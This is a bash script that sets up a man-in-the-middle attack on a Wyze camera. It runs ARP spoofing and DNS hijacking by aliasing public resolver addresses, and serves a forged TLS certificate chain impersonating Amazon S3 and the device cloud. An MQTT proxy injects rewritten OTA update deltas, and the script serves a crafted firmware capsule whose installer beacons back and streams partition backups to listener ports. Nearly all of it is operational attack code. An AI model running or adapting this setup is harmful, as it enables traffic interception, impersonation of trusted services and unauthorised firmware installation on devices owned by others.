#!/bin/bash
# Bring the local MITM stack up for ONE camera and prove each listener.
# Children are plain background jobs with redirected stdio: under launchd there is no controlling
# terminal, and nohup fails to detach there ("can't detach from console") and the children die.
#
# Deterministic rebuild: the scapy venv, the TLS bundle and the served tree are created here if
# absent. Everything under /tmp dies with a reboot, so nothing here may depend on a /tmp file
# existing — the forged leaf and the device cert set are rebuilt from the repo on every run.
#
#   OTA_URL=... OTA_MD5=... wyze_mitm_up.sh [CAM_MAC]
#
# The camera is addressed by MAC, not by IP: DHCP moved .4.23/.4.24 to .4.39/.4.51 and the old
# addresses are now held by other vendors' devices, so a hardcoded IP silently targets the wrong box.
set -u
PY=/opt/homebrew/bin/python3
HERE="$(cd "$(dirname "$0")" && pwd)"

# Fast port→PID lookup. lsof walks every mount including the /Volumes autofs mounts and
# takes ~22 SECONDS per call on this machine (measured 2026-11-05), which blew the
# wrapper's spawn/retry timing and thrashed the planes. netstat -anv -p tcp does the
# same lookup in 0.2s and includes the owning pid as "ProcName:PID".
port_pids() {  # $1 = tcp port number → prints space-separated PIDs
    # netstat is invoked under /bin/sh because this session's environment (one of the
    # ~40 agent vars) makes netstat -anv output NOTHING under #!/bin/bash (measured
    # 2026-11-05: bash script → 0 lines, sh → 635 lines). lsof was the previous
    # implementation: 22 s per call (autofs walk) — 100x slower.
    /bin/sh -c 'netstat -anv -p tcp 2>/dev/null' | awk -v port="$1" '$4 ~ ("[.]" port "$") && /LISTEN/ {
        for (i = 5; i <= NF; i++) if ($i ~ /^[A-Za-z]+:[0-9]+$/) { n = split($i, a, ":"); print a[n] }
    }' | sort -u
}
# Everything privileged here runs under sudo, so the /tmp logs are root-owned and a launchd start
# (as the user) cannot append to them: every plane came up with "Permission denied" instead of a
# log. Re-own ours before anything writes.
sudo -n mkdir -p /tmp/ota
for f in /tmp/ota/arm.log /tmp/dns.log /tmp/arp.log /tmp/ota/tls.log /tmp/img8080.log /tmp/img.log \
         /tmp/mqproxy.log /tmp/ota/chain.pem /tmp/serve443.pem /tmp/iot2.pem /tmp/iot2.key; do
  sudo -n touch "$f" 2>/dev/null && sudo -n chown "$(id -u)" "$f" 2>/dev/null
done
CERTS="$HERE/../certs"
# The root-run forge (launchd wyze-forge) appends to /tmp/ota/tls.log and /tmp/ota/forge.log; when it
# recreates them they come back root-owned and this user-run wrapper's redirections fail with
# "Permission denied" (measured 2026-11-04). Re-own the mutable set on every run, after any
# root process had a chance to clobber them.
for f in /tmp/ota/tls.log /tmp/dns.log /tmp/arp.log /tmp/img8080.log /tmp/img.log /tmp/mqproxy.log; do
  [ -f "$f" ] && [ "$(stat -f %Su "$f" 2>/dev/null)" != "$(id -un)" ] && sudo -n chown "$(id -u)" "$f" 2>/dev/null
done
CAP_DIR="${CAP_DIR:-/tmp/fwserve}"
CAP_PATH="${CAP_PATH:-wuv2/upgrade/HL_CAM4/firmware/4.52.17.32.tar}"
CAM_MAC="${1:-${CAM_MAC:-80:48:2c:4b:cf:0b}}"
GW="${GW:-192.168.4.1}"
GWMAC="${GWMAC:-48:dd:0c:c9:ec:0d}"
UP="${UP:-192.168.4.160}"
# One canonical form: lowercase hex with every octet zero-padded, separators stripped. Both sides go
# through this, so a colonless MAC (what the launchd plist carries) and arp's unpadded print
# (`…:52:59:5` for the octet 05) compare equal. Stripping separators alone is not enough — losing
# `05`→`5` makes the strings different lengths and the lookup silently reports "not on the LAN".
norm_mac() {
  local f out=
  for f in $(echo "$1" | tr 'A-F' 'a-f' | tr ':-.' '   '); do
    out="$out$(printf '%2s' "$f" | tr ' ' 0)"
  done
  echo "$out"
}
# Identity follows the target MAC. Both used to be hardcoded to the original demo unit, so arming
# for the other camera silently ran the cloud session as the wrong thing: the proxy went upstream
# with the wrong store certificate and every injected delta/command addressed the wrong shadow.
DEV="${DEV:-$(norm_mac "$CAM_MAC" | tr 'a-f' 'A-F')}"
THING="${THING:-$(norm_mac "$CAM_MAC" | tr 'A-F' 'a-f')}"
OTA_URL="${OTA_URL:-https://s3-us-west-2.amazonaws.com/$CAP_PATH}"

arp_lookup() {
  $ARP_CMD -an 2>/dev/null | awk '{ gsub(/[()]/, "", $2); print $2, $4 }' \
    | while read -r ip mac; do
        [ -n "$ip" ] && [ "$(norm_mac "$mac")" = "$(norm_mac "$CAM_MAC")" ] && { echo "$ip"; break; }
      done
}
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp}"

# --- prerequisites -------------------------------------------------------------------------
[ -x /tmp/sp/bin/python ] || { python3 -m venv /tmp/sp && /tmp/sp/bin/pip -q install scapy; }

# /tmp state is shared between a root run (sudo, dry runs) and the launchd LaunchAgent, which
# runs as the user: a root-owned log makes the agent's plain redirections fail and the plane
# silently never starts (measured: dns/arp/tls dead, only :443 up). Hand these files back to
# the invoking user instead of teaching every writer to pipe through sudo.
# The cert files are NOT zeroed here: this run may defer at the single-flight lock before
# rebuilding them, and an empty /tmp/iot2.pem breaks every TLS spawn with "PEM lib"
# (measured 2026-11-04). They are chowned and rebuilt at the cert section instead.
for f in /tmp/dns.log /tmp/arp.log /tmp/ota/tls.log /tmp/mqproxy.log; do
  sudo -n install -m 0644 -o "$(id -un)" -g "$(id -gn)" /dev/null "$f" 2>/dev/null || true
done

# Single-flight guard: two overlapping generations kill each other's children (each run's
# free_port/pkill sweeps SIGTERM the previous run's dns/arp/forge kids mid-bringup — measured
# 2026-11-04 as permanent plane flapping). With KeepAlive, exiting 0 when a peer holds the lock
# just defers to the next respawn; the lock holder releases via EXIT trap.
LOCK=/tmp/wyze_mitm_bringup.lock
# A root-descendant generation can leave the lock root-owned; recover ownership before the
# test (a root-owned lock made every user-run defer with "Permission denied", 2026-11-04).
[ -f "$LOCK" ] && [ "$(stat -f %Su "$LOCK" 2>/dev/null)" != "$(id -un)" ] && sudo -n chown "$(id -u)" "$LOCK" 2>/dev/null
if [ -s "$LOCK" ]; then
  other=$(cat "$LOCK" 2>/dev/null)
  if [ -n "$other" ] && kill -0 "$other" 2>/dev/null && [ "$other" != "$$" ]; then
    echo "bring-up already running as pid $other — deferring"
    exit 0
  fi
fi
echo $$ > "$LOCK"
trap 'rm -f "$LOCK"' EXIT

# Cert files are chowned here, AFTER the lock gate: zeroing (install /dev/null) before the
# lock let every deferring generation truncate the LIVE chain.pem while the lock holder's
# proxy was loading it — the proxy died with "PEM lib", KeepAlive respawned, and the next
# generation truncated again (measured 2026-11-06: chain.pem 0 bytes, 8883 crash-loop).
for f in /tmp/ota/chain.pem /tmp/serve443.pem; do
  sudo -n touch "$f" 2>/dev/null && sudo -n chown "$(id -u)" "$f" 2>/dev/null
done

# camera address: arp is the authority, and a sweep is the only way to find a moved unit
CAM=""
for _ in 1 2; do
  CAM=$(arp_lookup)
  [ -n "$CAM" ] && break
  for i in $(seq 1 254); do (ping -c1 -W 200 "192.168.4.$i" >/dev/null 2>&1) & done
  wait
done
[ -n "$CAM" ] || { echo "FATAL: camera $CAM_MAC is not on the LAN (arp empty after a sweep)"; exit 1; }

# interface + redirect address: the DNS answers point at $UP, so it must be local
IFACE="${IFACE:-$(route -n get "$CAM" 2>/dev/null | awk '/interface:/{print $2}')}"
[ -n "$IFACE" ] || { echo "FATAL: no route to $CAM"; exit 1; }
# The alias must carry the interface's own netmask. A /32 alias is treated as a host on the wire:
# the kernel ARPs for it, the ARP clone expires, and the address stops answering (measured).
MASK="${MASK:-$(ifconfig "$IFACE" | awk '/inet 192\.168\./{print $4; exit}')}"
[ -n "$MASK" ] || { echo "FATAL: cannot read the netmask of $IFACE"; exit 1; }
if ! ifconfig "$IFACE" | grep "inet $UP " | grep -q "netmask $MASK"; then
  ifconfig "$IFACE" | grep -q "inet $UP " && sudo ifconfig "$IFACE" -alias "$UP"
  sudo ifconfig "$IFACE" alias "$UP" netmask "$MASK" || { echo "FATAL: cannot alias $UP on $IFACE"; exit 1; }
fi

# device cert set: repo copy is authoritative (~/.config is not versioned and vanished once)
CERTDIR="$CERTS/iot/$DEV"
for f in cert.pem privkey.pem rootCA.crt; do
  [ -s "$CERTDIR/$f" ] || { echo "FATAL: missing $CERTDIR/$f (the proxy loops on registration without it)"; exit 1; }
done

# forged chain: leaf + intermediate + key, newline-separated (a PEM without a trailing newline
# glues the next header on and OpenSSL answers "PEM: BAD_END_LINE")
# Ownership: the root-run wyze-forge launchd daemon also (re)writes these /tmp files; when it
# does they come back root-owned and the user-run redirections here fail silently, leaving
# stale/empty certs (measured 2026-11-04: /tmp/iot2.pem 0 bytes → "PEM lib" on every spawn).
# Always chown before writing.
mkdir -p /tmp/ota
sudo -n chown "$(id -u)" /tmp/ota/chain.pem /tmp/serve443.pem /tmp/iot2.pem /tmp/iot2.key 2>/dev/null
# Atomic write: the MQTT proxy (a concurrent reader) crashes with "PEM lib" if it opens
# chain.pem mid-rebuild — a partial file fails load_cert_chain and the proxy exits, so
# KeepAlive restarts the whole plane stack. tmp+rename is atomic on the same filesystem.
{ cat "$CERTS/emudhra/leaf.pem"; echo; cat "$CERTS/emudhra/ev-ca-aaa-cross.pem"; echo; cat "$CERTS/emudhra/leaf.key"; } > /tmp/ota/chain.pem.tmp && mv /tmp/ota/chain.pem.tmp /tmp/ota/chain.pem
cp /tmp/ota/chain.pem /tmp/serve443.pem
# /tmp/iot2.pem must be the CERT ONLY (the forge builds serve.pem = cert + intermediate and
# hands serve.pem + iot2.key to load_cert_chain; concatenating the key here made serve.pem's
# first block a private key → "PEM lib" / KEY_VALUES_MISMATCH).
cat "$CERTS/emudhra/leaf.pem" > /tmp/iot2.pem.tmp && mv /tmp/iot2.pem.tmp /tmp/iot2.pem
cp "$CERTS/emudhra/leaf.key" /tmp/iot2.key

# served tree: capsule + the three IoT files + the image plane
mkdir -p "$CAP_DIR/wuv2/upgrade/HL_CAM4/firmware" "$CAP_DIR/fss" "$CAP_DIR/img"
for f in cert.pem privkey.pem; do sudo cp "$CERTDIR/$f" "$CAP_DIR/fss/$f"; done
# rootCA.crt is the broker's trust anchor: the store root validates the DEVICE cert and the
# forged chain's anchor (AAA) validates our broker leaf. Served alone the store root makes the
# device park at TLS after the handoff ("unable to get local issuer certificate"). The forge
# builds the same bundle in memory; this copy covers a static /fss/ serve. A PEM needs its
# trailing newline or the next header glues on (BAD_END_LINE).
{ cat "$CERTDIR/rootCA.crt"; echo; cat "$CERTS/emudhra/aaa-root.pem"; } \
  | sudo tee "$CAP_DIR/fss/rootCA.crt" >/dev/null
SERVED="$CAP_DIR/$CAP_PATH"
if [ ! -s "$SERVED" ]; then
  # zero-write dispatch probe: platform_upgrade never checks the exit status, so extra uptime proves
  # the script ran. A real capsule is staged by the operator; this only keeps the stack armable.
  PROBE="${PROBE:-/tmp/probe.sh}"
  [ -s "$PROBE" ] || printf '#!/bin/sh\nsleep 120\n' > "$PROBE"
  "$PY" "$HERE/build_ota_tar.py" --script "$PROBE" --out-dir /tmp/cap_probe --no-aes >/dev/null \
    && cp /tmp/cap_probe/Upgrade.tar "$SERVED"
fi
[ -s "$SERVED" ] || { echo "FATAL: no capsule at $SERVED and the build failed"; exit 1; }
MD5=$(md5 -q "$SERVED")
# the responder and the capsule must agree, or the device stops at the MD5 gate
if [ -n "${OTA_MD5:-}" ] && [ "$OTA_MD5" != "$MD5" ]; then
  # the bytes on disk are the truth; a stale env value would make the device stop at the MD5 gate
  echo "WARN: OTA_MD5=$OTA_MD5 but $SERVED is $MD5 — using the file digest"
fi
OTA_MD5="$MD5"
if [ -s "$CAP_DIR/img.bin" ]; then
  pinned=$(tar xOf "$SERVED" Upgrade/upgraderun.sh 2>/dev/null | awk -F= '/^IMG_SHA=/{print $2; exit}')
  [ -z "$pinned" ] || [ "$(shasum -a 256 "$CAP_DIR/img.bin" | cut -d' ' -f1)" = "$pinned" ] \
    || { echo "FATAL: img.bin does not match the capsule's pinned sha256"; exit 1; }
fi

sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
# stale listeners shadow new runs silently (EADDRINUSE). Another pane may hold the same ports and
# respawn them, so each port is waited on (bounded) instead of assumed free after one kill.
free_port() {
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    pids=$(port_pids "$1")
    [ -z "$pids" ] && return 0
    # don't kill a contract-complete forge — the launchd daemon owns it and KeepAlive
    # would respawn it into a kill loop with this wrapper (the 2026-11-03 flap)
    contract=""
    for p in $pids; do
      c=$(sudo ps -o command= -p $p 2>/dev/null)
      echo "$c" | grep -q -- '--iot-cert' || continue
      contract="$contract $p"
    done
    # keep only pids NOT in the contract list
    keep=""
    for p in $pids; do
      echo "$contract" | grep -qw "$p" || keep="$keep $p"
    done
    pids=$keep
    [ -z "$pids" ] && return 0
    sudo kill $pids 2>/dev/null
    sleep 0.5
  done
  return 1
}
# The launchd com.jeffreyemanuel.wyze-forge daemon also serves 443/8443 with the same contract
# and KeepAlive=true, so killing a live holder here makes the two supervisors fight forever
# (measured 2026-11-03: 219 launchd events in 3 min, planes flapping under every preflight run).
# Rule: a holder whose command line already carries the iot-cert contract is adopted, not killed;
# only a stale/bare forge (the liberation2-worktree failure mode) is replaced.
forge_ok() {
  local pids; pids=$(port_pids "$1")
  [ -n "$pids" ] || return 1
  sudo ps -o command= -p $pids 2>/dev/null | grep -q -- '--iot-cert'
}
for port in 443 8443 8883 8080 9101; do
  # same adoption rule as the TLS loop below: never kill a contract-complete forge — the
  # wyze-forge launchd daemon would just respawn it and the two supervisors would fight
  if { [ "$port" = 443 ] || [ "$port" = 8443 ]; } && forge_ok "$port"; then continue; fi
  # 8883 is served by an exec'd wyze_mqtt_mitm from a PRIOR generation: free_port only waits,
  # so a stale proxy here makes this generation's proxy die at bind (measured: 3700+ restart
  # loop) and KeepAlive restarts the whole plane stack forever.
  if [ "$port" = 8883 ]; then
    # ADOPT the running proxy instead of killing it — the running proxy has the latest
    # code and the camera's MQTT session. Killing it drops the session and the camera's
    # MQTT backoff restarts (measured 2026-11-05: the camera went silent for 2+ hours).
    pids=$(port_pids 8883)
    [ -n "$pids" ] && { echo "adopting running proxy (pids:$pids)"; continue; }
  fi
  free_port "$port" || echo "WARN: port $port still held after 5 s"
done
sudo pkill -f 'wyze_dns_redirect.py' 2>/dev/null
sudo pkill -f 'wyze_arp_spoof.py' 2>/dev/null
# DNS is intercepted by aliasing the public resolvers the camera uses: a packet addressed to a
# local address is delivered to our :53 socket, whereas an rdr to a local address is not delivered
# on this host. The camera's own resolver list is 8.8.8.8/8.8.4.4/208.67.x/.4.1; the first three
# are covered here and answer instantly, so they win the race against the real gateway.
# Same netmask rule as $UP: a /32 alias is ARP'd on the wire and stops answering. A pre-existing
# alias with a different mask is replaced.
for ip in 8.8.8.8 8.8.4.4 208.67.220.123 208.67.222.123; do
  if ifconfig "$IFACE" | grep "inet $ip " | grep -q "netmask $MASK"; then continue; fi
  ifconfig "$IFACE" | grep -q "inet $ip " && sudo ifconfig "$IFACE" -alias "$ip"
  sudo ifconfig "$IFACE" alias "$ip" netmask "$MASK"
done

sudo "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
sudo /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAM_MAC" "$GW" "$GWMAC" "$IFACE" > /tmp/arp.log 2>&1 &
# forged TLS on 443 (device API/S3) and 8443 (the alternate port the device also validated).
for port in 443 8443; do
  # the root forge may have recreated /tmp/ota/tls.log root-owned after our startup chown
  [ -f /tmp/ota/tls.log ] && [ "$(stat -f %Su /tmp/ota/tls.log)" != "$(id -un)" ] && sudo -n chown "$(id -u)" /tmp/ota/tls.log 2>/dev/null
  if forge_ok "$port"; then
    echo "tls: port $port already served by a contract-complete forge — adopting it"
    continue
  fi
  for attempt in 1 2 3; do
    extra=""
    if [ "$port" = 443 ]; then
      # the certificate handoff is answered here; without this flag the forge passes the call
      # through to the real cloud and the device never receives our URLs or trust anchor
      extra="--iot-cert --iot-cert-dir $CERTS/iot"
      [ "${FIRMWARE_DETAIL:-0}" = 1 ] && extra="$extra --firmware-detail"
    fi
    # The redirect must happen in the ROOT shell: /tmp/ota/tls.log keeps getting recreated
    # root-owned by an unidentified root writer, and a user-shell redirection fails with
    # EACCES, silently killing the spawn (measured: 8443 plane dead, no log line anywhere).
    sudo sh -c "exec '$PY' '$HERE/wyze_forge_serve.py' --dir '$CAP_DIR' --port '$port' \
      --cert /tmp/iot2.pem --key /tmp/iot2.key --intermediate '$CERTS/emudhra/ev-ca-aaa-cross.pem' \
      --sni s3-us-west-2.amazonaws.com $extra >> /tmp/ota/tls.log 2>&1" &
    # python + ssl cert load takes 2-4 s; a single 1 s check raced the bind and
    # free_port then killed the freshly-spawned forge every attempt (measured
    # 2026-11-05 once the fast netstat helper removed the old 22 s lsof delay).
    for _ in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
      sleep 1
      forge_ok "$port" && break
    done
    forge_ok "$port" && break
    free_port "$port"
  done
done
# image + beacon plane: the capsule's installer fetches /img.bin here and the payloads beacon here.
# The beacon-aware server (not plain http.server) is spawned so /fss-ran hits are logged to
# /tmp/fss_beacons.log for loop_closer; the separate fss-fwserve launchd job is NOT loaded
# alongside this wrapper — two supervisors on :8080 flap (same lesson as the :443 forge note).
sudo "$PY" "$HERE/fwserve_with_beacon.py" > /tmp/img8080.log 2>&1 &
sudo "$PY" -m http.server 9101 --directory "$CAP_DIR/img" > /tmp/img.log 2>&1 &
# the capsule streams every partition back before it writes; without a receiver it dies at step 2
# Backup ports must match the capsule's installer scheme: it streams partition backups to
# $PORT+1+slot with PORT=443 baked into upgraderun.sh (444..449 for six MTD partitions).
# The old base-port 8446 listened on 8447+ — the installer's nc would hit closed ports and
# die at step 2, before the flash (measured 2026-11-04). The receiver now runs as the
# PERSISTENT root LaunchDaemon com.jeffreyemanuel.fss-backup-recv (base-port 443) — do NOT
# pkill or spawn it here: the daemon's KeepAlive and this wrapper's pkill were fighting
# (each bring-up SIGTERM'd the daemon; the daemon respawned; repeat — measured 2026-11-05).
# The daemon's plist lives in deliverables/launchd/ + /Library/LaunchDaemons/.
if [ "${FOREGROUND:-0}" = 1 ]; then
  # launchd supervises the proxy in the foreground; the listeners above are its children.
  # REWRITE edits the cloud's own wyze-service delta in flight — it is the delivery that has
  # actually produced fetches, and it was never passed by this script.
  THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 REWRITE="${REWRITE:-1}" \
    NO_UPSTREAM="${NO_UPSTREAM:-}" \
    OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
    OTA_ACTIONS="${OTA_ACTIONS:-}" PROC_NAME="${PROC_NAME:-}" \
    OTA_ENC="${OTA_ENC:-3}" OTA_ENR="${OTA_ENR:-}" \
    rm -f "$LOCK";  # the exec replaces this process — the EXIT trap never fires,
                    # leaving a stale lock that blocks all future generations forever
    exec "$PY" "$HERE/wyze_mqtt_mitm.py"
fi
sudo env NO_UPSTREAM="${NO_UPSTREAM:-}" THING="$THING" D="$CERTDIR" CHAIN=/tmp/ota/chain.pem INJECT=1 REWRITE="${REWRITE:-1}" \
  OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
  OTA_ACTIONS="${OTA_ACTIONS:-}" PROC_NAME="${PROC_NAME:-}" \
  OTA_ENC="${OTA_ENC:-3}" OTA_ENR="${OTA_ENR:-}" \
  "$PY" "$HERE/wyze_mqtt_mitm.py" > /tmp/mqproxy.log 2>&1 &
sleep 3

down=0
for probe in "udp 53" "tcp 443" "tcp 8443" "tcp 8883" "tcp 8080" "tcp 9101"; do
  set -- $probe
  if [ "$1" = udp ]; then n=$(/usr/sbin/netstat -anv -p udp 2>/dev/null | grep -c "\.$2 ")
  else n=$(/usr/sbin/netstat -anv -p tcp 2>/dev/null | grep -cE "\.$2 .*LISTEN"); fi
  if [ "$n" -ge 2 ]; then printf '%-10s up\n' "$1:$2"; else printf '%-10s DOWN\n' "$1:$2"; down=1; fi
done
[ "$(ps -ef | grep -c "[w]yze_arp_spoof")" -ge 1 ] && echo "spoof      up" || { echo "spoof      DOWN"; down=1; }
echo "camera     $CAM ($CAM_MAC) on $IFACE"
echo "redirect   $UP"
echo "delta      $OTA_URL md5=$OTA_MD5"
dig @"$UP" aws-iot.wyzecam.com +short +time=2 +tries=1
exit "$down"
